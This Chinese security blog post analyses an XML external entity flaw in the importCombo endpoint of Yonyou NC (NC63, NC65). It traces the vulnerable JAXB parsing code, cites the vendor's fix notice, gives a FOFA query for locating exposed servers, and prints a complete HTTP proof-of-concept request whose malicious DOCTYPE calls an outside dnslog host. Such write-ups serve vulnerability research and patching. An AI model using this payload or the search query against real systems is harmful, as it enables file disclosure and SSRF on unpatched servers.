---
title: "用友NC importCombo XML实体注入（XXE）漏洞"
source: https://mrxn.net/jswz/yonyou-nc-portalcombo-importCombo-xxe.html
asset_dir: assets/用友nc-importcombo-xml实体注入（xxe）漏洞
---

# 用友NC importCombo XML实体注入（XXE）漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/11 17:20
- 947浏览
- [0评论](#comment)
- 23分钟阅读

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC系统存在XML外部实体注入（[XXE](https://mrxn.net/tag/XXE)）漏洞。攻击者可通过构造恶意XML文件，利用importCombo接口上传并解析，实现任意文件读取或SSRF攻击等攻击，进而可能导致敏感信息泄露或进一步的系统入侵。

# 影响版本

NC63、NC65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

根据官方漏洞通告部分可知漏洞点url为 portal/pt/portalcombo/importCombo

[![用友NC importCombo XML实体注入（XXE）漏洞](images/img-001-d7c99f8a6548.webp)](https://image.mrxn.net/c7d5e31b10864779afd82fa07e7f269e.webp)

那就直接看 `PortalComboAction` 里 `importCombo` 方法是如何实现的

```
@Action
public void importCombo() throws IOException {
    MultipartHttpServletRequest req = PortalComboAction.getMultipartResolver(this.request);
    Map fileMap = req.getFileMap();
    ArrayList files = new ArrayList();
    if (MapUtils.isNotEmpty((Map)fileMap)) {
        files.addAll(fileMap.values());
    }
    InputStream in = ((MultipartFile)files.get(0)).getInputStream();
    try {
        ComboOperTools.doImPort((InputStream)in);
    }
    catch (LfwBusinessException e) {
        PortalLogger.error((Throwable)e);
    }
    finally {
        IOUtils.closeQuietly((InputStream)in);
    }
}
```

代码不多，很简单，就是将请求的上传文件的第一个文件内容带入`ComboOperTools.doImPort` 方法，跟进 `doImPort` 方法看下它是如何实现的

```
public static void doImPort(InputStream in) throws IOException, LfwBusinessException {
    String xml = IOUtils.toString((InputStream)in);
    ComboPackObj packObj = (ComboPackObj)JaxbMarshalFactory.newIns().encodeXML(ComboPackObj.class, xml);
    UwComboVO combo = new UwComboVO();
    combo.setTitle(packObj.getTitle());
```

`doImPort` 方法的作用是将输入流中的XML数据读取为字符串，并反序列化为ComboPackObj对象，然后将其标题赋值给UwComboVO对象的title属性等等一系列赋值操作，我们重点关注 `encodeXML` 的实现

```
public <T> T encodeXML(Class<T> clazz, String xml) {
    if (xml == null) {
        return null;
    }
    Unmarshaller um = (Unmarshaller)JaxbPoolManager.getUnMarshaller(clazz);
    StringReader reader = new StringReader(xml);
    try {
        Object object = um.unmarshal(reader);
        return (T)object;
    }
```

ok。到达本次[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)触发点，该方法使用 JAXB 的 `Unmarshaller` 处理用户可控的 XML 输入，但默认未禁用外部实体解析，从而导致 [XXE](https://mrxn.net/tag/XXE) 注入，从而引发任意文件读取、内网探测、SSRF 等问题。

[![用友NC importCombo XML实体注入（XXE）漏洞](images/img-002-87e24c101b08.webp)](https://image.mrxn.net/22333996332a45ab9ce7475110bde1b8.webp)

# 漏洞复现

```
POST /portal/pt/portalcombo/importCombo?pageId=login HTTP/1.1
Host: nc.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.png"

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
------WebKitFormBoundary--
```

[![用友NC importCombo XML实体注入（XXE）漏洞](images/img-003-3521b8dddf13.webp)](https://image.mrxn.net/418ed2893b3a401fa8809d8e3efeb948.webp)

成功在DNSLOG平台收到其DNS请求和HTTP请求

# 参考

- [关于NC系统ComboOperTools存在XML实体注入漏洞的修复通告](https://security.yonyou.com/#/noticeInfo?id=725)

- 标签：
- [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
- [#XXE](https://mrxn.net/tag/XXE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
